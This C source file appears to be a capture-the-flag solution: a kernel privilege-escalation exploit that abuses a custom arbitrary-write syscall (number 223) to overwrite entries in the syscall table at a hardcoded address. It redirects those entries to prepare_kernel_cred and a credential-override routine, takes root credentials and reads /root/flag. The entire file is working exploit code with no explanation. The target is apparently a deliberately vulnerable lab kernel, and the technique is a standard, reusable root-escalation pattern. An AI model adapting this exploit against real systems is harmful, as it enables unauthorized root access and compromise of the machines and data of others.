#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/syscall.h>


// Syscall table starting address
#define SYS_CALL_TABLE		0x8000e348
#define NR_SYS_UNUSED		223
#define NR_SYS_VM86			113

#define PREP_KCRED 0x8003f924
#define OVERRIDE_CREDS 0x8003f3d8

unsigned int** sct;

int change_sys_call(unsigned int *addr_written, unsigned int *overwrite_adr) {
    char *out;
    char in[5];
    unsigned int addr = (unsigned int)overwrite_adr;
    
    in[0] = addr & 0xFF;
    in[1] = (addr >> 8) & 0xFF;
    in[2] = (addr >> 16) & 0xFF;
    in[3] = (addr >> 24) & 0xFF;
    in[4] = '\0';
    
	out = (char *)addr_written;
    syscall(NR_SYS_UNUSED, in, out);
    return 0;
}

int main(void) {
	void *cred;
	int fd;
	char flag[100];
	
	sct = (unsigned int**)SYS_CALL_TABLE;
	unsigned int *sys_unused = (unsigned int *)(SYS_CALL_TABLE + NR_SYS_UNUSED * sizeof(unsigned int*));
	unsigned int *sys_vm86 = (unsigned int *)(SYS_CALL_TABLE + NR_SYS_VM86 * sizeof(unsigned int*));
	
	change_sys_call(sys_vm86, (unsigned int *)PREP_KCRED);
	cred = (void *)syscall(NR_SYS_VM86, NULL);
	change_sys_call(sys_unused, (unsigned int *)OVERRIDE_CREDS);
	syscall(NR_SYS_UNUSED, cred);
	
	fd = open("/root/flag", O_RDONLY, 0644);
	read(fd, flag, sizeof(flag));
	
	printf("Flag is: %s", flag);
	return 0;
}